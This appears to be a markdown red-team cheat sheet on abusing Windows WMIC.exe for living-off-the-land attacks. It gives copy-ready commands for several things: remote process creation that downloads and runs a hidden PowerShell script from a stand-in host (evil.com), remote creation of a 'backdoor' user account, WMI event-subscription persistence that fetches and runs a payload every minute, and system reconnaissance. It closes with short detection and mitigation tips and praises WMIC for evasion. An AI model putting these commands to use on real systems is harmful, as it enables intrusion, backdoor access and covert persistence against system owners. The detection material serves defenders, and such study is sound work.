# 🧬 WMIC - Living Off the Land

**WMIC.exe** (Windows Management Instrumentation Command-line) is a native Windows tool used for managing systems. Attackers abuse it for **process execution, enumeration, persistence, and lateral movement** — often without writing any files to disk.

> ⚠️ Use these techniques only in authorized red team labs or simulations.

---

## 🛠️ What It Does
- Spawns processes (locally or remotely)
- Interacts with services, users, and system settings
- Can persist malware via WMI event subscriptions
- Works over the network with minimal visibility

---

## 💣 Common LotL WMIC Techniques

### 1. Spawn a Remote Process
```cmd
wmic /node:"target_ip" process call create "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')"
```
✅ Remote execution using only built-in tools — no agent needed

---

### 2. Local Process Creation
```cmd
wmic process call create "cmd.exe /c calc.exe"
```
✅ Launches a new process — similar to PowerShell or task scheduler

---

### 3. Lateral Movement via WMI
```cmd
wmic /node:"192.168.1.50" /user:"admin" /password:"pass123" process call create "cmd.exe /c net user backdoor pass123 /add"
```
✅ Executes command remotely — attacker can create users, backdoors, or implants

---

### 4. WMI Persistence (via subscription)
```powershell
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name='ExampleFilter'; EventNamespace='root\cimv2'; QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 5 WHERE TargetInstance ISA "Win32_LocalTime" AND TargetInstance.Second = 0'}
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name='ExampleConsumer'; CommandLineTemplate='powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString("http://evil.com/evil.ps1")'}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter; Consumer=$Consumer}
```
✅ Triggers malicious PowerShell every minute without traditional persistence methods

---

### 5. Dump System Info Silently
```cmd
wmic computersystem get name, domain, username
```
✅ Enumeration for recon or reporting

---

## 🕵️‍♂️ Detection Tips
| Indicator | Detection Method |
|-----------|------------------|
| `wmic process call create` | Flag process launches via WMIC — rarely used by real admins |
| WMI persistence classes used | Monitor for new `__EventFilter` or `CommandLineEventConsumer` objects |
| Lateral WMI activity | Look for remote WMI calls across internal IP ranges |
| Unusual user context | Detect WMIC launched under user accounts running scheduled tasks

---

## 🔐 Mitigation Strategies
- Restrict remote WMI with firewall or GPO
- Audit `root\subscription` for suspicious WMI bindings
- Disable WMIC if not in use (deprecated in newer Windows versions)
- Monitor logs: Event IDs 5861, 5860, 5858 (WMI activity)

---

> 🧠 WMIC is quiet and native — ideal for evasion and remote ops. It pairs well with PowerShell, task scheduler, or persistence frameworks like CactusTorch.
